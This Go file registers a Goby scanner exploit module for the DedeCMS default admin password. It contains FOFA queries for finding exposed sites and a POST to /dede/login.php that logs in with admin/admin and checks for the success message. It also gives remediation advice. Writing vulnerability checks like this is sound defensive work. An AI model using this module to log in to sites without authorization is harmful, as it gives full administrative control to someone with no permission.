package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "DedeCMS Default Password Vulnerability",
    "Description": "<p>DedeCMS has a weak password vulnerability, allowing attackers to log in to the backend using default administrator credentials (e.g., admin/admin) and gain full control of the system.</p>",
    "Product": "DedeCMS",
    "Homepage": "http://www.dedecms.com/",
    "DisclosureDate": "2025-01-02",
    "PostTime": "2025-01-02",
    "Author": "2826161446@qq.com",
    "FofaQuery": "((body=\"Power by DedeCms\" || (body=\"Powered by\" && body=\"http://www.dedecms.com/\" && body=\"DedeCMS\") || body=\"/templets/default/style/dedecms.css\") || body=\"<div><h3>DedeCMS Error Warning!</h3>\")",
    "GobyQuery": "((body=\"Power by DedeCms\" || (body=\"Powered by\" && body=\"http://www.dedecms.com/\" && body=\"DedeCMS\") || body=\"/templets/default/style/dedecms.css\") || body=\"<div><h3>DedeCMS Error Warning!</h3>\")",
    "Level": "2",
    "Impact": "<p>This vulnerability allows attackers to log in to the backend using weak passwords, potentially leading to full control of the website, sensitive data leakage, and other security issues.</p>",
    "Recommendation": "<p>It is recommended to immediately change the default administrator username and password, set a strong password, and restrict IP addresses that can access the backend. Additionally, regularly check system logs for abnormal login activities.</p>",
    "References": [
        "https://cloud.tencent.com/developer/information/dedecms%20%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/dede/login.php",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "gotopage=%2Fdede%2F&dopost=login&adminstyle=newdedecms&userid=admin&pwd=admin&sm1="
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "document.write(\"成功登录，正在转向管理管理主页！\");",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|define|variable|{{{scheme}}}://admin@admin:{{{hostinfo}}}"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/dede/login.php",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "gotopage=%2Fdede%2F&dopost=login&adminstyle=newdedecms&userid=admin&pwd=admin&sm1="
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "成功登录，正在转向管理管理主页！",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|NULL|text|Please use \"admin:admin\" to {{{scheme}}}://{{{hostinfo}}}/dede/login.php login"
            ]
        }
    ],
    "Tags": [
        "Default Password",
        "2H1W"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "5.8",
    "Translation": {
        "CN": {
            "Name": "DedeCMS 默认口令漏洞",
            "Product": "DedeCMS",
            "Description": "<p>DedeCMS 存在弱口令漏洞，攻击者可以通过默认的管理员账号和密码（如 admin/admin）登录后台，从而获取系统的完全控制权限。</p>",
            "Recommendation": "<p>建议管理员立即修改默认的管理员账号和密码，设置强密码，并限制后台登录的IP地址。同时，定期检查系统日志以发现异常登录行为。</p>",
            "Impact": "<p>该漏洞允许攻击者通过弱口令登录后台，可能导致网站被完全控制，敏感数据泄露以及其他安全问题。</p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "DedeCMS Default Password Vulnerability",
            "Product": "DedeCMS",
            "Description": "<p>DedeCMS has a weak password vulnerability, allowing attackers to log in to the backend using default administrator credentials (e.g., admin/admin) and gain full control of the system.</p>",
            "Recommendation": "<p>It is recommended to immediately change the default administrator username and password, set a strong password, and restrict IP addresses that can access the backend. Additionally, regularly check system logs for abnormal login activities.</p>",
            "Impact": "<p>This vulnerability allows attackers to log in to the backend using weak passwords, potentially leading to full control of the website, sensitive data leakage, and other security issues.</p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "VariablesOrder": [],
    "EditType": "fast",
    "PocId": "9981"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
